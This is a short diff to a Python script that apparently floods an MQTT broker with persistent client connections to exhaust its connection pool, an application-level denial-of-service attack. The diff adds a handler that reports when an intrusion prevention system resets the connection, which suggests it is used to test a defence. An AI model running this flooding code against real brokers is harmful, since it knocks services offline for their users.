@@ -4,10 +4,15 @@ import time
 import argparse
 import random
 
+def on_disconnect(client, userdata, rc):
+    if rc != 0:
+        print(f"🚨 CONNECTION KILLED BY IPS: TCP connection reset by peer!")
+
 def attack(broker, port, thread_id):
     try:
         client_id = f"attacker_{thread_id}_{random.randint(1000, 9999)}"
         client = mqtt.Client(client_id)
+        client.on_disconnect = on_disconnect
         client.connect(broker, port, 60)
         # Keep connection open to exhaust connection pools (Application-level attack)
         client.loop_start()
